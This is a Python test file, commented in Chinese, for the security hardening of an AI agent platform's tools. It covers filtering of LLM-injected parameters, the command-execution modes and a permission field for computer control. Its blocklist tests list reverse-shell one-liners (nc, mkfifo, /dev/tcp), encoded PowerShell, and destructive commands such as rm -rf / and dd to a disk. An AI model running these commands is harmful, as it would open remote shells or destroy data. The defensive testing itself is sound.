# tests/test_tool_security.py
"""v2.2.1 F5+F6+F7 安全重构测试

测试覆盖:
- F5: 工具参数白名单 (allowed_kwargs) — 过滤 LLM 注入的 allow_network 等敏感参数
- F6: 命令执行双模式 (allow_pipeline) + command_guard 加强黑名单
- F7: computer_* 工具独立权限字段 (computer_use_enabled) + 危险文本黑名单 + 截图压缩
"""
from __future__ import annotations

import io
import logging
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker

from server.db.migrations import run_lightweight_migrations
from server.db.orm import Base, Persona
from server.services.command_guard import check_command
from server.services.tool_executor import ToolExecutor
from server.tools.registry import get_tool, ToolResult


# ============================================================
# F5: 工具参数白名单
# ============================================================


async def _make_db():
    """内存数据库 + 建表 + 迁移,返回 (Session, engine)"""
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
        await conn.run_sync(run_lightweight_migrations)
    Session = async_sessionmaker(engine, expire_on_commit=False)
    return Session, engine


def _make_persona(**kwargs) -> Persona:
    """创建 transient persona 对象 (不入库)"""
    defaults = {
        "id": 1,
        "name": "test",
        "system_prompt": "sp",
        "model_provider": "mock",
        "model_name": "m",
        "tools_enabled": True,
        "rag_enabled": True,
        "sandbox_allow_network": False,
        "terminal_allowed": False,
        "browser_use_enabled": False,
        "computer_use_enabled": False,
    }
    defaults.update(kwargs)
    return Persona(**defaults)


class TestParameterWhitelist:
    """F5: 工具参数白名单 (allowed_kwargs)"""

    async def test_parameter_whitelist_filters_allow_network(self):
        """code_tool 应过滤 allow_network 参数 — 网络权限由 persona 决定,LLM 不可注入"""
        executor = ToolExecutor()
        persona = _make_persona(tools_enabled=True)
        Session, engine = await _make_db()

        # mock get_tool 返回一个能捕获 kwargs 的 mock 工具
        captured_kwargs: dict = {}

        async def _fake_execute(**kwargs):
            captured_kwargs.update(kwargs)
            return ToolResult(success=True, output="ok")

        mock_tool = MagicMock()
        mock_tool.allowed_kwargs = {"code", "timeout"}  # 不含 allow_network
        mock_tool.execute = _fake_execute

        with patch("server.services.tool_executor.async_session", Session), \
             patch("server.services.tool_executor.is_registered", return_value=True), \
             patch("server.services.tool_executor.get_tool", return_value=mock_tool):
            result = await executor.execute(
                "execute_code",
                {"code": "print('hi')", "allow_network": True},
                persona,
            )
        assert result["success"] is True
        # allow_network 必须被过滤掉,不能传到 tool.execute
        assert "allow_network" not in captured_kwargs
        assert "code" in captured_kwargs
        await engine.dispose()

    async def test_parameter_whitelist_filters_unknown_kwargs(self):
        """未知 kwargs 被过滤,只保留白名单内的参数"""
        executor = ToolExecutor()
        persona = _make_persona(tools_enabled=True)
        Session, engine = await _make_db()

        captured_kwargs: dict = {}

        async def _fake_execute(**kwargs):
            captured_kwargs.update(kwargs)
            return ToolResult(success=True, output="ok")

        mock_tool = MagicMock()
        mock_tool.allowed_kwargs = {"path", "encoding"}
        mock_tool.execute = _fake_execute

        with patch("server.services.tool_executor.async_session", Session), \
             patch("server.services.tool_executor.is_registered", return_value=True), \
             patch("server.services.tool_executor.get_tool", return_value=mock_tool):
            result = await executor.execute(
                "file_read",
                {
                    "path": "/tmp/x",
                    "encoding": "utf-8",
                    "malicious_param": "evil",
                    "another_unknown": 123,
                },
                persona,
            )
        assert result["success"] is True
        # 白名单内的参数应通过
        assert captured_kwargs.get("path") == "/tmp/x"
        assert captured_kwargs.get("encoding") == "utf-8"
        # 白名单外的 LLM 注入参数应被过滤
        assert "malicious_param" not in captured_kwargs
        assert "another_unknown" not in captured_kwargs
        await engine.dispose()

    async def test_parameter_whitelist_logs_warning(self):
        """被过滤时记录 warning 日志"""
        executor = ToolExecutor()
        persona = _make_persona(tools_enabled=True)
        Session, engine = await _make_db()

        async def _fake_execute(**kwargs):
            return ToolResult(success=True, output="ok")

        mock_tool = MagicMock()
        mock_tool.allowed_kwargs = {"code", "timeout"}
        mock_tool.execute = _fake_execute

        with patch("server.services.tool_executor.async_session", Session), \
             patch("server.services.tool_executor.is_registered", return_value=True), \
             patch("server.services.tool_executor.get_tool", return_value=mock_tool), \
             patch("server.services.tool_executor.logger") as mock_logger:
            await executor.execute(
                "execute_code",
                {"code": "x", "allow_network": True, "extra": "bad"},
                persona,
            )
            # 应该调用 logger.warning 至少一次,且包含被过滤的 key
            assert mock_logger.warning.called
            call_args = mock_logger.warning.call_args
            # 检查日志消息包含 allow_network 和 extra
            log_msg = str(call_args)
            assert "allow_network" in log_msg
            assert "extra" in log_msg
        await engine.dispose()

    def test_allowed_kwargs_declared_on_all_tools(self):
        """所有已注册工具都应有 allowed_kwargs 属性 (即使是空集合)"""
        from server.tools.registry import _tool_registry

        for name, cls in _tool_registry.items():
            tool = cls()
            assert hasattr(tool, "allowed_kwargs"), \
                f"工具 {name} 缺少 allowed_kwargs 属性"
            assert isinstance(tool.allowed_kwargs, set), \
                f"工具 {name} 的 allowed_kwargs 必须是 set"

    def test_code_tool_allowed_kwargs_excludes_allow_network(self):
        """CodeTool.allowed_kwargs 必须不含 allow_network"""
        tool = get_tool("execute_code")
        assert "code" in tool.allowed_kwargs
        assert "timeout" in tool.allowed_kwargs
        assert "allow_network" not in tool.allowed_kwargs


# ============================================================
# F6: 命令执行双模式
# ============================================================


class TestCommandToolDualMode:
    """F6: execute_command 双模式 (exec / shell)"""

    async def test_command_tool_non_shell_mode(self):
        """allow_pipeline=False 应使用 create_subprocess_exec (非 shell)"""
        from server.tools.command_tool import ExecuteCommandTool

        tool = ExecuteCommandTool()
        # mock create_subprocess_exec / create_subprocess_shell 来验证调用哪个
        mock_proc = MagicMock()
        mock_proc.communicate = AsyncMock(return_value=(b"exec_output", b""))
        mock_proc.returncode = 0
        mock_proc.kill = MagicMock()
        mock_proc.wait = AsyncMock()

        with patch("server.tools.command_tool.asyncio.create_subprocess_exec",
                   AsyncMock(return_value=mock_proc)) as mock_exec, \
             patch("server.tools.command_tool.asyncio.create_subprocess_shell",
                   AsyncMock(return_value=mock_proc)) as mock_shell:
            result = await tool.execute(command="echo hello", allow_pipeline=False)
            assert result.success is True
            assert "exec_output" in result.output
            # exec 模式应被调用,shell 不应被调用
            assert mock_exec.called, "allow_pipeline=False 应调用 create_subprocess_exec"
            assert not mock_shell.called, "allow_pipeline=False 不应调用 create_subprocess_shell"

    async def test_command_tool_shell_mode(self):
        """allow_pipeline=True 应使用 create_subprocess_shell"""
        from server.tools.command_tool import ExecuteCommandTool

        tool = ExecuteCommandTool()
        mock_proc = MagicMock()
        mock_proc.communicate = AsyncMock(return_value=(b"shell_output", b""))
        mock_proc.returncode = 0
        mock_proc.kill = MagicMock()
        mock_proc.wait = AsyncMock()

        with patch("server.tools.command_tool.asyncio.create_subprocess_exec",
                   AsyncMock(return_value=mock_proc)) as mock_exec, \
             patch("server.tools.command_tool.asyncio.create_subprocess_shell",
                   AsyncMock(return_value=mock_proc)) as mock_shell:
            result = await tool.execute(command="echo hello", allow_pipeline=True)
            assert result.success is True
            assert "shell_output" in result.output
            # shell 模式应被调用,exec 不应被调用
            assert mock_shell.called, "allow_pipeline=True 应调用 create_subprocess_shell"
            assert not mock_exec.called, "allow_pipeline=True 不应调用 create_subprocess_exec"

    async def test_command_tool_default_is_non_shell(self):
        """不传 allow_pipeline 时默认使用 exec 模式"""
        from server.tools.command_tool import ExecuteCommandTool

        tool = ExecuteCommandTool()
        mock_proc = MagicMock()
        mock_proc.communicate = AsyncMock(return_value=(b"ok", b""))
        mock_proc.returncode = 0
        mock_proc.kill = MagicMock()
        mock_proc.wait = AsyncMock()

        with patch("server.tools.command_tool.asyncio.create_subprocess_exec",
                   AsyncMock(return_value=mock_proc)) as mock_exec, \
             patch("server.tools.command_tool.asyncio.create_subprocess_shell",
                   AsyncMock(return_value=mock_proc)) as mock_shell:
            await tool.execute(command="echo hello")
            assert mock_exec.called, "默认应使用 exec 模式"
            assert not mock_shell.called, "默认不应使用 shell 模式"

    async def test_command_tool_shell_mode_blocks_dangerous(self):
        """shell 模式下危险命令仍被 command_guard 拦截"""
        from server.tools.command_tool import ExecuteCommandTool

        tool = ExecuteCommandTool()
        result = await tool.execute(command="rm -rf /", allow_pipeline=True)
        assert result.success is False
        assert "拦截" in result.error

    def test_command_tool_allowed_kwargs_includes_allow_pipeline(self):
        """ExecuteCommandTool.allowed_kwargs 应包含 allow_pipeline"""
        tool = get_tool("execute_command")
        assert "command" in tool.allowed_kwargs
        assert "timeout" in tool.allowed_kwargs
        assert "allow_pipeline" in tool.allowed_kwargs


# ============================================================
# F6: command_guard 加强黑名单
# ============================================================


class TestCommandGuardHardened:
    """F6: command_guard 新增黑名单 (powershell / base64 / 反shell / 链式)"""

    @pytest.mark.parametrize("cmd", [
        "Remove-Item -Recurse -Force C:\\Important",
        "Invoke-Expression 'malicious'",
        "Stop-Computer",
        "Start-Process cmd.exe",
        "Set-ExecutionPolicy Unrestricted",
    ])
    def test_command_guard_blocks_powershell(self, cmd: str):
        """PowerShell 危险 cmdlet 被拦截"""
        safe, reason = check_command(cmd)
        assert safe is False, f"应拦截 PowerShell 危险命令: {cmd}"
        assert "拦截" in reason

    @pytest.mark.parametrize("cmd", [
        "powershell -EncodedCommand SQBFAFgA",
        "base64 -d payload.b64",
        "base64 --decode payload.b64",
    ])
    def test_command_guard_blocks_base64(self, cmd: str):
        """base64 编码命令被拦截 (绕过字符串匹配的常见向量)"""
        safe, reason = check_command(cmd)
        assert safe is False, f"应拦截 base64 编码命令: {cmd}"
        assert "拦截" in reason

    @pytest.mark.parametrize("cmd", [
        "nc -e /bin/bash 10.0.0.1 4444",
        "ncat -e /bin/sh 192.168.1.1 8080",
        "mkfifo /tmp/pipe && cat /tmp/pipe | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/pipe",
        "bash -c 'exec 3<>/dev/tcp/10.0.0.1/4444'",
    ])
    def test_command_guard_blocks_reverse_shell(self, cmd: str):
        """反向 shell 模式被拦截"""
        safe, reason = check_command(cmd)
        assert safe is False, f"应拦截反向 shell: {cmd}"
        assert "拦截" in reason

    @pytest.mark.parametrize("cmd", [
        "rm -rf /tmp && echo done",
        "rm -rf ~ || echo failed",
        "format c: && echo formatted",
        "shutdown -h now && echo bye",
        "shutdown /s || echo failed",
    ])
    def test_command_guard_blocks_chained_dangerous(self, cmd: str):
        """链式危险命令 (rm/format/shutdown + &&/||) 被拦截"""
        safe, reason = check_command(cmd)
        assert safe is False, f"应拦截链式危险命令: {cmd}"
        assert "拦截" in reason

    def test_command_guard_blocks_dd_with_spaces(self):
        """dd of = /dev/... (带空格变体) 被拦截"""
        safe, reason = check_command("dd if=/dev/zero of = /dev/sda bs=1M")
        assert safe is False
        assert "dd" in reason

    @pytest.mark.parametrize("cmd", [
        "echo hello",
        "dir",
        "ls -la",
        "python --version",
        "git status",
        "pip list",
        "cd src && dir",
    ])
    def test_safe_commands_still_allowed(self, cmd: str):
        """安全命令不应被新黑名单误伤"""
        safe, reason = check_command(cmd)
        assert safe is True, f"安全命令被误拦截: {cmd} → {reason}"


# ============================================================
# F7: computer_* 权限字段
# ============================================================


class TestComputerPermissionField:
    """F7: computer_* 工具使用 computer_use_enabled 权限"""

    async def test_computer_tools_requires_computer_permission(self):
        """computer_screenshot 在 computer_use_enabled=False 时被拦截"""
        executor = ToolExecutor()
        persona = _make_persona(
            tools_enabled=True,
            computer_use_enabled=False,
            browser_use_enabled=True,  # 即使有 browser 权限,computer 也应被拦
        )
        Session, engine = await _make_db()

        with patch("server.services.tool_executor.async_session", Session):
            result = await executor.execute("computer_screenshot", {}, persona)
        assert result["success"] is False
        assert "computer_use_enabled" in result["error"]
        await engine.dispose()

    async def test_computer_tools_allowed_with_computer_permission(self):
        """computer_use_enabled=True 时权限通过 (执行可能因依赖失败,但权限不挡)"""
        executor = ToolExecutor()
        persona = _make_persona(
            tools_enabled=True,
            computer_use_enabled=True,
        )
        Session, engine = await _make_db()

        with patch("server.services.tool_executor.async_session", Session):
            result = await executor.execute("computer_screenshot", {}, persona)
        # 权限通过 — 失败原因不应是权限问题
        if not result["success"]:
            assert "computer_use_enabled" not in result["error"]
            assert "权限" not in result["error"]
        await engine.dispose()

    async def test_browser_tools_unaffected_by_computer_field(self):
        """browser_* 工具继续用 browser_use_enabled,不受 computer_use_enabled 影响"""
        executor = ToolExecutor()
        # computer_use_enabled=False 但 browser_use_enabled=True,browser_* 应通过权限
        persona = _make_persona(
            tools_enabled=True,
            browser_use_enabled=True,
            computer_use_enabled=False,
        )
        Session, engine = await _make_db()

        # mock browser_service 避免真实启动
        with patch("server.services.tool_executor.async_session", Session), \
             patch("server.services.browser_service.browser_service.start_session",
                   new_callable=AsyncMock), \
             patch("server.services.browser_service.browser_service.get_status",
                   new_callable=AsyncMock), \
             patch("server.services.browser_service.browser_service.navigate",
                   new_callable=AsyncMock):
            result = await executor.execute(
                "browser_navigate", {"url": "https://example.com"}, persona
            )
        # 失败可以,但不应是权限原因 (browser_use_enabled)
        if not result["success"]:
            assert "browser_use_enabled" not in result["error"]
        await engine.dispose()

    def test_persona_model_has_computer_use_enabled_field(self):
        """Persona 模型应有 computer_use_enabled 字段,且列默认值为 False"""
        from server.db.orm import Persona

        assert hasattr(Persona, "computer_use_enabled")
        # 检查列定义的默认值是 False (安全优先)
        # 注意: SQLAlchemy 的 default=False 在 INSERT 时生效,
        # transient 对象可能为 None,所以检查 mapped_column 定义
        col = Persona.__table__.columns.get("computer_use_enabled")
        assert col is not None, "computer_use_enabled 列应存在"
        assert col.default is not None, "computer_use_enabled 应有默认值"
        assert col.default.arg is False, \
            f"computer_use_enabled 默认值应为 False,实际为 {col.default.arg}"

    def test_migration_includes_computer_use_enabled(self):
        """migrations.py 应包含 computer_use_enabled 迁移条目"""
        from server.db.migrations import _MIGRATIONS

        matches = [
            (t, c, d) for (t, c, d) in _MIGRATIONS
            if t == "personas" and c == "computer_use_enabled"
        ]
        assert len(matches) == 1, "应有且仅有一条 computer_use_enabled 迁移"
        _, _, col_def = matches[0]
        assert "BOOLEAN" in col_def.upper()
        assert "DEFAULT 0" in col_def.upper()


# ============================================================
# F7: computer_type_text 危险文本黑名单
# ============================================================


class TestComputerTypeTextSafety:
    """F7: computer_type_text 危险文本检测"""

    @pytest.mark.parametrize("text", [
        "format c:",
        "format D:",
        "del /f important.txt",
        "del /s /q *.tmp",
        "rm -rf /",
        "rm -rf ~",
        "shutdown /s /t 0",
        "shutdown -h now",
        "taskkill /f /im explorer.exe",
    ])
    async def test_computer_type_text_blocks_dangerous(self, text: str):
        """危险文本 (format/del/rm -rf/shutdown/taskkill) 被拦截"""
        from server.tools.computer_tools import ComputerTypeTextTool

        tool = ComputerTypeTextTool()
        with patch("server.tools.computer_tools._check_dependencies",
                   return_value=(True, "")):
            result = await tool.execute(text=text)
            assert result.success is False, f"应拦截危险文本: {text}"
            assert "拦截" in result.error

    @pytest.mark.parametrize("text", [
        "win+r",
        "ctrl+alt+del",
        "alt+f4",
        "WIN+R",
        "Ctrl + Alt + Del",
    ])
    async def test_computer_type_text_blocks_dangerous_hotkeys(self, text: str):
        """危险组合键被拦截"""
        from server.tools.computer_tools import ComputerTypeTextTool

        tool = ComputerTypeTextTool()
        with patch("server.tools.computer_tools._check_dependencies",
                   return_value=(True, "")):
            result = await tool.execute(text=text)
            assert result.success is False, f"应拦截危险组合键: {text}"
            assert "拦截" in result.error

    @pytest.mark.parametrize("text", [
        "hello world",
        "你好,世界",
        "print('hello')",
        "user@example.com",
        "https://example.com",
    ])
    async def test_computer_type_text_allows_safe_text(self, text: str):
        """安全文本通过检测,正常输入"""
        from server.tools.computer_tools import ComputerTypeTextTool

        tool = ComputerTypeTextTool()
        with patch("server.tools.computer_tools._check_dependencies",
                   return_value=(True, "")):
            mock_pa = MagicMock()
            with patch.dict("sys.modules", {"pyautogui": mock_pa}):
                result = await tool.execute(text=text)
                assert result.success is True, f"安全文本被误拦: {text} → {result.error}"


# ============================================================
# F7: computer_screenshot 截图压缩 (修复 S8)
# ============================================================


class TestComputerScreenshotCompression:
    """F7: computer_screenshot 截图压缩"""

    async def test_computer_screenshot_compressed(self):
        """截图应被压缩到 1024x768 内,并使用 JPEG 格式"""
        from server.tools.computer_tools import ComputerScreenshotTool

        tool = ComputerScreenshotTool()

        # 构造一个真实的大尺寸 PIL Image 作为截图
        # 用 PIL.Image.new 创建 1920x1080 的图像 (大于 1024x768)
        try:
            from PIL import Image
        except ImportError:
            pytest.skip("PIL 未安装,跳过截图压缩测试")

        big_img = Image.new("RGB", (1920, 1080), color=(255, 0, 0))

        with patch("server.tools.computer_tools._check_dependencies",
                   return_value=(True, "")):
            mock_pa = MagicMock()
            mock_pa.screenshot = MagicMock(return_value=big_img)
            with patch.dict("sys.modules", {"pyautogui": mock_pa}):
                result = await tool.execute()
                assert result.success is True, f"截图失败: {result.error}"
                # 输出应包含 JPEG 标识
                assert "JPEG" in result.output or "jpeg" in result.output.lower()
                # 输出应包含尺寸,且不超过 1024x768 (允许任一维度不超过上限)
                # thumbnail 保持比例,1920x1080 缩到 1024x576 (按 width=1024 比例)
                # 检查输出格式 "JPEG WxH"
                assert "x" in result.output  # 形如 "JPEG 1024x576"
                # 提取尺寸
                import re
                size_match = re.search(r"(\d+)x(\d+)", result.output)
                assert size_match is not None, f"输出未含尺寸: {result.output}"
                w, h = int(size_match.group(1)), int(size_match.group(2))
                assert w <= 1024, f"截图宽度 {w} 超过 1024"
                assert h <= 768, f"截图高度 {h} 超过 768"
                # 大图应被缩放 (1920x1080 缩到 1024x576)
                assert w < 1920 or h < 1080, "大图未被压缩"

    async def test_computer_screenshot_small_image_unchanged(self):
        """小尺寸截图不需要缩放,但仍输出 JPEG"""
        from server.tools.computer_tools import ComputerScreenshotTool

        tool = ComputerScreenshotTool()
        try:
            from PIL import Image
        except ImportError:
            pytest.skip("PIL 未安装,跳过")

        small_img = Image.new("RGB", (200, 100), color=(0, 255, 0))

        with patch("server.tools.computer_tools._check_dependencies",
                   return_value=(True, "")):
            mock_pa = MagicMock()
            mock_pa.screenshot = MagicMock(return_value=small_img)
            with patch.dict("sys.modules", {"pyautogui": mock_pa}):
                result = await tool.execute()
                assert result.success is True
                # 小图保持原尺寸
                import re
                size_match = re.search(r"(\d+)x(\d+)", result.output)
                assert size_match is not None
                w, h = int(size_match.group(1)), int(size_match.group(2))
                assert w == 200
                assert h == 100
